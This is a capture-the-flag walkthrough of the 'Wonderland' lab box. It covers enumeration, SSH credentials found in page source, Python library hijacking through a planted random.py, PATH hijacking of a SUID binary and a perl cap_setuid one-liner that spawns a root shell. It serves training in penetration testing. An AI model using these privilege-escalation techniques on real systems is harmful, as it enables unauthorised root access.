# Wonderland - Linux - Medium

**IP may vary over the document**

## Enumeration

### Nmap: `nmap -p- -T5 10.10.178.26 -oN nmap-initial -vv`

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Gobuster: `gobuster dir -u http://10.10.178.26/ -w ../common_wl.txt| tee gobuster-scan`

```
/img                  (Status: 301) [Size: 0] [--> img/]
/index.html           (Status: 301) [Size: 0] [--> ./]  
/r                    (Status: 301) [Size: 0] [--> r/] 
```

Checking contents of /r dir using gobuster we get: 

```
/a                    (Status: 301) [Size: 0] [--> a/]
/index.html           (Status: 301) [Size: 0] [--> ./]
```

Why do I feel like this will go on for a while like this. This is what the web address looks like now: `http://10.10.178.26/r/a/`. I have a feeling this will be **rabbit** *(Cause when Alice followed rabbit into the hole she found about the wonderland.. This was the only logic I thought at that momment)*. 

Trying: `http://10.10.178.26/r/a/b/b/i/t/`

Checking the source code we can see: `alice:HowDothTheLittleCrocodileImproveHisShiningTail`

SSH creds maybe? Let's try and we are in. Awesome... But there is no user.txt rather we have **root.txt** which we cannot read.

Let's check the users on system: `grep -E "/bin/.*sh" /etc/passwd`

```bash
root:x:0:0:root:/root:/bin/bash
tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
```

Doing `sudo -l` reveals we can execute certain command as rabbit user. 

```bash
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

We have read perms on *walrus\*.py* file but no write perms. Let's see what it is doing. 

```python
import random

poem="SOME LONG POEM HERE"

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

Executing it just prints out some random lines from the poem. What can I do with it? 

Doing a little bit research it seems if I make a python file with the same name as being imported (in this case random.py) in the same directory as the file calling it(walrus\*.py), it would not actually import python library *random* but would rather import the *random.py* file in it's current directory. Awesome looks like we can get to run custom commands as user **rabbit**.

Creating a random.py file

```python
import os 

def func1():
    cmd = "ls -al /home/rabbit"
    print(os.system(cmd))
    os.system("cd /home/rabbit; file *")

def choice(var):
    func1()
    exit(1)
```

Let's run this *walrus\*.py* as rabbit user

`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

We get the following output

```bash
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
0
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
```

There seems to be just a *teaParty* file which seems to have **suid** bit set. Let's run that and check if we can get something out of this.

Altering the **random.py** again

```python
import os 

def func1():
    cmd = "ls -al /home/rabbit"
    print(os.system(cmd))
    os.system("cd /home/rabbit; file *")

def func2():
    cmd = "/home/rabbit/teaParty"
    os.system(cmd)

def choice(var):
    func2()
    exit(1)
    return 1
``` 

Executing that *walrus\*.py* again.. We have the following output

```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Mon, 14 Jun 2021 16:11:08 +0000
Ask very nicely, and I will give you some tea while you wait for him
as
Segmentation fault (core dumped)
```

No matter what the input is supplied it ends up giving a **Segmentation fault error**. Is this thing **BufferOverflow**?. Seems like I need to get the binary.

Altering the **random.py** again

```python
import os 

def func1():
    cmd = "ls -al /home/rabbit"
    print(os.system(cmd))
    os.system("cd /home/rabbit; file *")

def func2():
    cmd = "cp /home/rabbit/teaParty /tmp"
    os.system(cmd)

def choice(var):
    func2()
    exit(1)
``` 

Executing that *walrus\*.py* again.. we have our binary copied to /tmp folder. Now just do a simple **scp** to copy the file to our attacking machine.


## Analysing the binary

Using **radare2** for analysis reveals something like the following under *main* section in the binary

`"/bin/echo -n 'Probably by ' && date --date='next hour' -R"`

It seems it is using /bin/echo as to make sure it reads the correct binary but *date* is there without any absolute path... hence I might me able to trick the binary using **$PATH modification/manipulation**.


## Getting user rabbit 

After a lot of trial and error with the binary and path manipulation as user **alice** resulted in nothing. Using the *random.py* we can get the shell for user **rabbit**.

```python
os.system("/bin/bash")
```

After having the shell for **rabbit** create a shell script with the name **date** with following contents:

```bash
#!/bin/bash

/bin/bash
```

Now time for path varible manipulation:

```bash
export PATH=/home/rabbit:$PATH
```

Executing the binary now will result in a shell as user **hatter**. Just navigate to /home/hatter and cat out the **password.txt** file. Using this file one can ssh to user **hatter**.

Contents of /home/hatter/password.txt: `WhyIsARavenLikeAWritingDesk?`

Using `sudo -l` : resulted in nothing usefull

Checking for binaries with suid using `find -perm -u=s -type f 2>/dev/null` : resulted in nothing usefull. Lets go [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).

LinPEAS reports about sudo version. Checking searchsploit for said sudo version resulted in nothing. 

It also reports:

```bash
/usr/bin/perl
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
```

Checking [gftobins](https://gtfobins.github.io/gtfobins/perl/) reveals:

```
If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
```

Using the below exploit we can gain root privellages.

```bash
usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

`/root/` directory has the file called **user.txt** while `/home/alice/` directory has the file called **root.txt**. Just cat out the files for flags.
